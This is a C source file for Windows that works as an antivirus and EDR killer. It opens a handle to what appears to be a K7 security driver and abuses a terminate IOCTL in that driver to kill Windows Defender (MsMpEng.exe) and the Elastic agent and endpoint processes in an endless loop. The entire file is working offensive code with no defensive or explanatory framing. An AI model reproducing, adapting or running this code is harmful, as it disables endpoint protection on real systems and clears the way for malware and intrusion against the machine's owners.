#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>

#define DRIVER_SYMLINK L"\\\\.\\DosK7RKScnDrv"
#define TERMINATE_IOCTL 0x222018
#define WINDOWS_ENGINE TRUE
#define ELASTIC_AGENT TRUE
#define ELASTIC_ENDPOINT TRUE

typedef struct _killerBuff {
	int PID;
	BYTE BUFFER2 [8];
} killerBuff, * pKillerBuff;

int EnumerateProcess(const wchar_t* ProcessName) {
	DWORD PID = 0;
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot;
	int pid = -1;

	// Take a snapshot of all processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Get the first process
	if (Process32First(hSnapshot, &pe32)) {
		do {
			// Compare process name (case-insensitive)
			char* filename = pe32.szExeFile;
			if (_wcsicmp((char*)pe32.szExeFile, ProcessName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return pid;
}

static void KillByName(HANDLE hDriver, wchar_t* processName) {
	DWORD PID = EnumerateProcess(processName);
	killerBuff buff = { {NULL},PID,{NULL} };

	BOOL ioctl_result;
	DWORD bytesReturned = 0;
	BYTE outBuffer[256];

	if (PID != -1) {
		ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff), &outBuffer, 256, &bytesReturned, NULL);
		if (ioctl_result) {
			printf("[%d] %ls Must've Died\n", PID, processName);
		}
		else {
			printf("Something botched up\n");
		}
	}
#ifdef _DEBUG
	else {
		printf("No %ls Found !\n", processName);
	}
#endif
}

int main(int argc, char* argv[]) {
	DWORD bytesReturned = 0;
	BYTE outBuffer[256];
	DWORD PID;

	
	HANDLE hDriver = CreateFile(DRIVER_SYMLINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hDriver || hDriver == 0xffffffffffffffff) {
		printf("Could not open handle to the Driver\n");
		exit(1);
	}

	while (1) {
		if (WINDOWS_ENGINE) {
			wchar_t* windowsDefend = L"MsMpEng.exe";
			KillByName(hDriver, windowsDefend);
		}
		if (ELASTIC_AGENT) {
			wchar_t* elasticDefend = L"elastic-agent.exe";
			KillByName(hDriver, elasticDefend);
		}
		if (ELASTIC_ENDPOINT) {
			wchar_t* elasticDefend = L"elastic-endpoint.exe";
			KillByName(hDriver, elasticDefend);
		}
		Sleep(1500);
	}

	
}